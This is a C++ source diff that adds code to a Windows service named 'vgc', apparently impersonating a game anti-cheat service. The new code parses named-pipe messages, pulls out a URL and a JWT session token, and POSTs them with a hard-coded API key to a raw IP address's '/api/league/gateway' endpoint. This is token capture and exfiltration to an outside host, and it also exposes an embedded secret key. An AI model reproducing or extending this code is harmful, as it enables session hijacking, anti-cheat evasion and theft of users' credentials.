@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <winhttp.h>
 #include <string>
 #include <thread>
 #include <atomic>
@@ -8,6 +9,9 @@
 #include <sddl.h> 
 #include <sstream>
 #include <iomanip>
+#include <vector>
+
+#pragma comment(lib, "winhttp.lib")
 
 constexpr auto SERVICE_NAME = L"vgc";
 
@@ -49,6 +53,139 @@ static void Log(const std::wstring& msg) {
 void ServiceMain(DWORD argc, LPWSTR* argv);
 void WINAPI ServiceCtrlHandler(DWORD);
 void PipeServerThread();
+
+static std::string ExtractLengthPrefixedString(const char* data, DWORD dataSize, DWORD offset) {
+    if (offset + 4 > dataSize) return "";
+    DWORD strLen = *reinterpret_cast<const DWORD*>(data + offset);
+    if (offset + 4 + strLen > dataSize || strLen == 0 || strLen > 8192) return "";
+    return std::string(data + offset + 4, strLen);
+}
+
+static std::string ExtractJwtFromMessage2(const char* data, DWORD dataSize) {
+    // Structure: [header 28 bytes] [len(4)] [UUID string] [01 00] [len(4)] [JWT string] ...
+    // First read UUID length at offset 0x1C
+    if (dataSize < 0x20) return "";
+    DWORD uuidLen = *reinterpret_cast<const DWORD*>(data + 0x1C);
+    if (uuidLen == 0 || uuidLen > 256) return "";
+    DWORD uuidEnd = 0x1C + 4 + uuidLen; // end of UUID string
+    // After UUID: 01 00 separator (2 bytes), then JWT length (4 bytes), then JWT
+    DWORD jwtLenOffset = uuidEnd + 2; // skip 01 00
+    if (jwtLenOffset + 4 > dataSize) return "";
+    DWORD jwtLen = *reinterpret_cast<const DWORD*>(data + jwtLenOffset);
+    DWORD jwtStart = jwtLenOffset + 4;
+    if (jwtLen == 0 || jwtLen > 8192 || jwtStart + jwtLen > dataSize) return "";
+    return std::string(data + jwtStart, jwtLen);
+}
+
+static void PostToGateway(const std::string& jwt, const std::string& url) {
+    const std::string apiKey = "soyuz_XK00JhSJL259av8628ackj6196AgyfpSqM89nf8mtWKTMKlt";
+
+    // Build JSON body
+    std::string jsonBody = "{\"jwt\":\"" + jwt + "\",\"url\":\"" + url + "\",\"api_key\":\"" + apiKey + "\"}";
+
+    // Log request
+    {
+        std::wstringstream ss;
+        ss << L"[HTTP] POST http://45.126.209.235:3020/api/league/gateway";
+        Log(ss.str());
+    }
+    {
+        std::wstringstream ss;
+        ss << L"[HTTP] Request body length: " << jsonBody.size();
+        Log(ss.str());
+    }
+
+    HINTERNET hSession = WinHttpOpen(L"vgc/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        Log(L"[HTTP] WinHttpOpen failed");
+        return;
+    }
+
+    HINTERNET hConnect = WinHttpConnect(hSession, L"45.126.209.235",
+        3020, 0);
+    if (!hConnect) {
+        Log(L"[HTTP] WinHttpConnect failed");
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
+        L"/api/league/gateway", NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        Log(L"[HTTP] WinHttpOpenRequest failed");
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    const wchar_t* headers = L"Content-Type: application/json\r\n";
+    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)-1,
+        (LPVOID)jsonBody.c_str(), (DWORD)jsonBody.size(),
+        (DWORD)jsonBody.size(), 0);
+
+    if (!bResult) {
+        DWORD err = GetLastError();
+        std::wstringstream ss;
+        ss << L"[HTTP] WinHttpSendRequest failed, error " << err;
+        Log(ss.str());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    bResult = WinHttpReceiveResponse(hRequest, NULL);
+    if (!bResult) {
+        DWORD err = GetLastError();
+        std::wstringstream ss;
+        ss << L"[HTTP] WinHttpReceiveResponse failed, error " << err;
+        Log(ss.str());
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Read status code
+    DWORD statusCode = 0;
+    DWORD statusCodeSize = sizeof(statusCode);
+    WinHttpQueryHeaders(hRequest,
+        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX);
+
+    // Read response body
+    std::string responseBody;
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    do {
+        dwSize = 0;
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        if (dwSize > 0) {
+            std::vector<char> chunk(dwSize + 1, 0);
+            WinHttpReadData(hRequest, chunk.data(), dwSize, &dwDownloaded);
+            responseBody.append(chunk.data(), dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    // Log response
+    {
+        std::wstringstream ss;
+        ss << L"[HTTP] Response status: " << statusCode;
+        Log(ss.str());
+    }
+    {
+        std::wstringstream ss;
+        ss << L"[HTTP] Response body: ";
+        for (char c : responseBody) ss << static_cast<wchar_t>(c);
+        Log(ss.str());
+    }
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+}
 
 static int WINAPI wmain(int argc, wchar_t* argv[]) {
     SERVICE_TABLE_ENTRY ServiceTable[] = {
@@ -237,6 +374,8 @@ void PipeServerThread() {
         char buffer[4096]{};
         DWORD bytesRead = 0;
         int messageCount = 0;
+        std::string extracted_url;
+        std::string extracted_jwt;
 
         while (!shutdown_event.load()) {
             BOOL success = ReadFile(pipe, buffer, sizeof(buffer), &bytesRead, nullptr);
@@ -263,6 +402,38 @@ void PipeServerThread() {
                 hexStream << std::hex << std::setw(2) << std::setfill(L'0')
                 << static_cast<int>(static_cast<unsigned char>(buffer[i])) << L' ';
             Log(hexStream.str());
+
+            // Extract URL from message #1
+            if (messageCount == 1) {
+                extracted_url = ExtractLengthPrefixedString(buffer, bytesRead, 0x1C);
+                if (!extracted_url.empty()) {
+                    std::wstringstream ss;
+                    ss << L"[EXTRACT] URL from msg#1: ";
+                    for (char c : extracted_url) ss << static_cast<wchar_t>(c);
+                    Log(ss.str());
+                } else {
+                    Log(L"[EXTRACT] Failed to extract URL from msg#1");
+                }
+            }
+
+            // Extract JWT from message #2, then POST
+            if (messageCount == 2) {
+                extracted_jwt = ExtractJwtFromMessage2(buffer, bytesRead);
+                if (!extracted_jwt.empty()) {
+                    std::wstringstream ss;
+                    ss << L"[EXTRACT] JWT from msg#2 (" << extracted_jwt.size() << L" bytes)";
+                    Log(ss.str());
+                } else {
+                    Log(L"[EXTRACT] Failed to extract JWT from msg#2");
+                }
+
+                if (!extracted_url.empty() && !extracted_jwt.empty()) {
+                    Log(L"[EXTRACT] Both URL and JWT extracted. Sending to gateway...");
+                    PostToGateway(extracted_jwt, extracted_url);
+                } else {
+                    Log(L"[EXTRACT] Missing URL or JWT, cannot POST to gateway.");
+                }
+            }
 
             // Send one-time message after second message received
             if (messageCount == 2)
